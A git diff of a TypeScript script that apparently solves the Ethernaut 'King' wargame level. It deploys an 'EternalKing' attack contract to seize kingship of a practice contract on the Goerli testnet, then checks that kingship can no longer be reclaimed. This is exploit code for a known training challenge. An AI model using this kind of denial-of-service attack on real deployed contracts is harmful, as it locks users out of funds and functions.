@@ -9,7 +9,7 @@ const attackVault = async () => {
     // change contract addresses here.
     const kingAddress = "0x3acAB497d1474153706206d5094805e9c047123F"; //type "await contract.address()" in ethernaut console
     const args: any[] = [];
-    const deployer = process.env.PRIVATE_KEY || "";
+    const player = process.env.PRIVATE_KEY || "";
     // [deployer] = await ethers.getSigners();
 
     // Don't touch below 🚀
@@ -22,7 +22,7 @@ const attackVault = async () => {
     // const deployed = await deployContract(hre, "EternalKing", args);
     // alternative below
     console.log("Deploying attack contract eternalKing...");
-    const attack = await (await ethers.getContractFactory("EternalKing", deployer)).deploy();
+    const attack = await (await ethers.getContractFactory("EternalKing", player)).deploy();
     console.log(attack);
     console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
@@ -41,6 +41,13 @@ const attackVault = async () => {
     //         }
     //     }
     // }
+
+    // wallet
+    // using my custom rpc stored in .env (for privacy)
+    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
+    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
+    const wallet = new ethers.Wallet(player, provider);
+    console.log("Player's address is: ", wallet.address);
 
     // typing all commands in console below
     // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
@@ -84,24 +91,14 @@ const attackVault = async () => {
     const tx1 = await attack.claimKingship(kingAddress, { value: prize });
     const tx1Receipt = await tx1.wait();
     console.log(tx1Receipt);
-    //TODO: check king can't be reclaimed
-    // const provider = await ethers.getDefaultProvider("goerli");
-    // /*Private Keys in .env file or hardcode here*/
-    // const PRIVATE_KEY = process.env.PRIVATE_KEY || "";
-    // const wallet = new Wallet(PRIVATE_KEY, provider);
-    // const fail = await expect(
-    //     wallet.sendTransaction({
-    //         from: player,
-    //         value: prize,
-    //     })
-    // ).to.be.reverted;
-    // console.log(`Transaction Failed?: ${fail}`);
-    // if (fail) {
-    //     console.log("Done, Submit to ethernaut.");
-    // } else {
-    //     console.log("Review code and try again...");
-    // }
-    console.log("Done, Submit to ethernaut.");
+    console.log("Now checking if kingship could be reclaimed...");
+    try {
+        await wallet.sendTransaction({ from: wallet.address, to: kingAddress, value: prize });
+        console.log("Please review code above and try again...");
+    } catch (err) {
+        console.log(err);
+        console.log("Congrats! Level passed, please submit to ethernaut");
+    }
 };
 
 attackVault()
